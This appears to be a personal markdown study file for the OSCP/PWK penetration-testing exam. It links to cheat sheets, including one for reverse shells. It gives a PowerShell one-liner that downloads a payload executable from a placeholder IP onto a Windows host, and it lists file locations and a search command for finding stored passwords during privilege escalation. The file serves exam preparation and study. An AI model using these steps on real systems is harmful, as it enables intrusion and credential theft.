# TJ Null Path to Try Harder
TJNull presented at BSidesDC 2019.  I've been using his blog as a good reference point to start for things to review BEFORE signing up for PWK.  Some content I decided to put in their own `md` files.  Links can be found here: https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
# Active Recon

## Service Enum - Pen Testing Cheat Sheet

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
Local File Inclusion (LFI): https://highon.coffee/blog/lfi-cheat-sheet/
Linux Commands: https://highon.coffee/blog/linux-commands-cheat-sheet/ 
`systemd`/`systemctl` cheat sheet: https://highon.coffee/blog/systemd-cheat-sheet/
Reverse Shell Cheat Sheet: https://highon.coffee/blog/reverse-shell-cheat-sheet/

## Transferring Files to Your Account - Linux --> Windows
https://blog.ropnop.com/transferring-files-from-kali-to-windows/
- When on Windows (no `curl` or `wget`) use PS `WebClient` object: `(new-object System.Net.WebClient).DownloadFile('http://IP_ADDR/met888.exe','C:\Users\AdminUser\
Desktop\met888.exe')`

## Transferring Files to Your Account - Tools -
- `bitsadmin` - Windows command line tool to create download/upload jobs and monitor progress

## Privileger Escalation
### Windows Guides - Fundamentals
http://www.fuzzysecurity.com/tutorials/16.html
Location to check for config files w/stored passwords:
Typically these are the directories that contain the configuration files (however it is a good idea to check the entire OS):
- c:\sysprep.inf
- c:\sysprep\sysprep.xml
- %WINDIR%\Panther\Unattend\Unattended.xml
- %WINDIR%\Panther\Unattended.xml

In addition to Groups.xml (stored in SYSVOL) several other policy preference files can have the optional "cPassword" attribute set:
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes

### Windows Priv Esc Guide
Commands to run to check for XAMPP, Apache, or PHP and check for config files:
`dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf`